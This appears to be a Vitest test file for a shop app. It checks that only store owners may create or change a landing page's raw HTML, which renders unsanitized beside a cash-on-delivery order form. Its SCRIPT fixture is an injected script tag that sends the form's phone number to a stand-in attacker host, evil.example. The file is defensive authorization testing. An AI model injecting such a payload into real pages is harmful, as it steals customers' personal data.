import { beforeEach, describe, expect, it, vi } from "vitest";

// WHERE THE `landing:html` BOUNDARY SITS — measured by CALLING `saveLanding`, not by reading it.
//
// `lp/[slug].astro` renders a landing's html with `set:html`: emitted into the SSR response BODY and
// handled by the browser's HTML parser, so a `<script>` in it RUNS — on the shop's own origin, on the
// page carrying the COD order form (name, WhatsApp, full address). No sanitizer, no CSP. That is why
// the 2026-07-30 decision made the raw markup owner-only (`landing:html`).
//
// The decision has a SHAPE, and the shape is the part a refactor loses:
//
//   · the gate is on the HTML **CHANGING**, not on the action. Staff keep managing a landing's title,
//     slug, product, countdown and funnel fields — none of which execute anywhere.
//   · so **creating** a landing with EMPTY html is staff work, and creating one WITH html is not.
//     `/promo/html/baru` (N54) made that boundary reachable for the first time; before the create
//     route existed, the only exercised path was the update.
//
// `rbac-landing.test.ts` beside this file pins the MATRIX (`can("staff", "landing:html") === false`).
// Nothing pinned what the action DOES with it, and the two failure modes are opposite: hoisting the
// check to the top of `saveLanding` takes the whole feature away from staff silently, and dropping it
// hands every staff user in every tenant a script tag on the checkout page. Both type-check.
//
// ── HOW IT IS CALLED ─────────────────────────────────────────────────────────────────────────────
//
// `requireCapability` (session/cookies) and `withTenant` (a real transaction) are the two server-only
// doors, so they are mocked and NOTHING else is — `can()` resolves through the real `rbac-policy`
// matrix, which is the thing under test. The stub db throws a sentinel the first time the action
// queries anything, so "was the gate open?" is answered by whether execution REACHED the database,
// with no schema fixture and no rows written.
//
// PROVED RED (2026-08-05) against two mutated COPIES of `actions/landing.ts` — never the product file
// itself, which another stream may own. Three of the six fail each time, and they are DIFFERENT
// threes, which is the point:
//   · gate hoisted above the diff (the whole feature escalated to owner) → "staff may CREATE a
//     landing with no html", "staff may still edit everything else", "staff may not CHANGE the html"
//     (that one goes red on the query count: it refuses before reading the stored row).
//   · gate deleted → "staff may NOT create one carrying html", "staff may not CHANGE the html of an
//     existing landing", "an owner-only refusal is RETURNED".

const STORE = "11111111-1111-4111-8111-111111111111";
const PRODUCT = "22222222-2222-4222-8222-222222222222";
const LANDING = "33333333-3333-4333-8333-333333333333";

// `@tokophi/db` throws at import when DATABASE_URL is unset, and `actions/landing.ts` imports its
// `schema` as a value. Nothing here connects (every query hits the stub first), so any parseable URL
// does — that keeps this suite runnable on a laptop with no Docker, unlike the ledger suites.
process.env.DATABASE_URL ??= process.env.TEST_DATABASE_URL ?? "postgresql://none:none@127.0.0.1:1/none";

const h = vi.hoisted(() => ({
  role: "staff" as string,
  /** Rows the stub hands back, in query order. When it runs out, the next query throws. */
  rows: [] as unknown[][],
  queries: 0,
}));

class ReachedDb extends Error {
  constructor() {
    super("REACHED_DB");
  }
}

/** `db.select(…).from(…).where(…).limit(1)` — enough of the builder to observe, never to execute. */
const chain = () => {
  h.queries += 1;
  const rows = h.rows.shift();
  if (!rows) throw new ReachedDb();
  const link = { from: () => link, where: () => link, limit: async () => rows, innerJoin: () => link };
  return link;
};

vi.mock("@/lib/rbac", () => ({
  requireCapability: async () => ({ userId: "u", storeId: STORE, role: h.role, email: "s@t.id", name: "S" }),
}));
vi.mock("@/lib/tenant", () => ({
  withTenant: async <T>(_storeId: string, fn: (db: unknown) => Promise<T>) =>
    fn({ select: chain, insert: chain, update: chain, delete: chain }),
}));
vi.mock("next/cache", () => ({ revalidatePath: () => {} }));

const { saveLanding } = await import("./actions/landing");

const input = (over: Partial<Parameters<typeof saveLanding>[0]> = {}) => ({
  slug: "promo-lebaran",
  title: "Promo Lebaran",
  html: "",
  productId: PRODUCT,
  enabled: true,
  countdownMinutes: 0,
  showScarcity: true,
  formConfig: { email: false, quantity: false, trustBadges: true, summary: true },
  ...over,
});

const SCRIPT = '<section><script>fetch("https://evil.example/"+document.forms[0].tel.value)</script></section>';
const refusal = /Pemilik toko/;

beforeEach(() => {
  h.role = "staff";
  h.rows = [];
  h.queries = 0;
});

describe("landing:html gates the MARKUP, not the feature", () => {
  it("staff may CREATE a landing with no html — the create route's normal case", async () => {
    // No id ⇒ prior html is "", so an empty draft changes nothing executable. Reaching the database
    // (the product/slug checks) is what "the gate let it through" looks like from out here.
    await expect(saveLanding(input())).rejects.toThrow(ReachedDb);
  });

  it("staff may NOT create one carrying html", async () => {
    const res = await saveLanding(input({ html: SCRIPT }));
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(refusal);
    // Refused BEFORE any query: nothing is read, nothing is written, no row is half-made.
    expect(h.queries).toBe(0);
  });

  it("the owner may create one carrying html", async () => {
    h.role = "owner";
    await expect(saveLanding(input({ html: SCRIPT }))).rejects.toThrow(ReachedDb);
  });

  it("staff may still edit everything else on an existing landing", async () => {
    // The whole point of gating the DIFF: same html back, different title. First query returns the
    // stored row, and getting to the SECOND one means the gate stayed open.
    h.role = "staff";
    h.rows = [[{ html: SCRIPT }]];
    await expect(saveLanding(input({ id: LANDING, html: SCRIPT, title: "Judul baru" }))).rejects.toThrow(ReachedDb);
    expect(h.queries).toBe(2);
  });

  it("staff may not CHANGE the html of an existing landing", async () => {
    h.rows = [[{ html: "<p>lama</p>" }]];
    const res = await saveLanding(input({ id: LANDING, html: SCRIPT }));
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(refusal);
    expect(h.queries).toBe(1); // only the read of the stored html
  });

  it("an owner-only refusal is RETURNED, never thrown — Next masks a thrown Error in production", async () => {
    // The `{ ok, error }` half of the two-file rule (AGENTS.md): the editor toasts `res.error`, and a
    // digest in its place would tell the merchant nothing about why their save did not happen.
    const res = await saveLanding(input({ html: SCRIPT }));
    expect(res).toEqual({ ok: false, error: expect.stringMatching(refusal) });
  });
});
